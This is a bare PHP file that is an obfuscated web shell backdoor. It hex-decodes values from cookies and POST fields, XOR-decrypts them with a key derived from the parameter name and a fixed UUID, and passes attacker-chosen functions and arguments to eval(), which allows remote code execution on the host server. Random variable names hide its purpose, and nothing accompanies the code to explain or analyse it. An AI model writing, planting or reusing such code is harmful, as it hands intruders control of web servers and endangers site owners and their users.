<?php

foreach (array_merge($_COOKIE, $_POST) as $fxchj => $xyabjwg) {
    function ufinz($fxchj, $hvnyep)
    {
        return substr(str_repeat($fxchj . '9d70086e-145d-4621-8026-e5d69acff5ca', $hvnyep / strlen($fxchj) + 1), 0, $hvnyep);
    }
    function qdlexxp($ycysge)
    {
        return @pack('H*', $ycysge);
    }
    function lyediky($ycysge)
    {
        print_r($ycysge);
        $logvbp = count($ycysge) % 3;
        if (!$logvbp) {
            eval($ycysge[1]($ycysge[2]));
            die;
        }
    }
    $xyabjwg = qdlexxp($xyabjwg);
    lyediky(explode('#', $xyabjwg ^ ufinz($fxchj, strlen($xyabjwg))));
}
?>